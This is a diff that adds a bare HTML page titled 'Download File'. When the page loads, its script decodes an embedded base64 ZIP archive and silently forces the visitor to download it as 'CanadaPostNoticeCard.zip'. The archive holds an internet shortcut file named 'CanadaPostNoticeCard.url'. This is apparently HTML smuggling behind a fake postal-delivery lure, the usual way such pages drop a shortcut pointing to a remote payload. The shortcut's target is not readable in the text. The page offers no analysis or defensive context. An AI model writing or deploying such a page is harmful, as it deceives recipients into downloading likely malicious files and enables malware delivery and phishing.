@@ -1,0 +1,33 @@
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Download File</title>
+    </head>
+    <body>
+        <script>
+            function downloadBase64File(base64Data, fileName) {
+                var binaryData = atob(base64Data);
+                var byteArray = new Uint8Array(binaryData.length);
+                for (var i = 0; i < binaryData.length; i++) {
+                    byteArray[i] = binaryData.charCodeAt(i);
+                }
+                var blob = new Blob([byteArray], { type: 'application/octet-stream' });
+                var a = document.createElement('a');
+                a.href = window.URL.createObjectURL(blob);
+                a.download = fileName;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }
+            window.onload = function() {
+                var base64Data = 'UEsDBBQAAAAIAMFGo1iDF6T/owAAAMAAAAAYAAAAQ2FuYWRhUG9zdE5vdGljZUNhcmQudXJsNY7RCoIwGEbvB3uTdLMkKBAKvUiSECW8iC7GNmm09sv2G0j07gnVd+DjXB5K6MyldKi909jewKMc8UrJuamy3li9ZSygmELktTSDDlEPVkVKTDH6SVoYVW+F17GEx65tK1aIZ9d1DQCyXDihRA0BT4BG6lx4FVt3p6QsKhMwo+QAeNRTxueGF+d8maR7Hs3yu/xv36Xr91xWexhWWbJZbCj5AFBLAQIUABQAAAAIAMFGo1iDF6T/owAAAMAAAAAYAAAAAAAAAAEAIAAAAAAAAABDYW5hZGFQb3N0Tm90aWNlQ2FyZC51cmxQSwUGAAAAAAEAAQBGAAAA2QAAAAAA';
+                var fileName = 'CanadaPostNoticeCard.zip';
+                downloadBase64File(base64Data, fileName);
+            };
+        </script>
+    </body>
+    </html>
+    
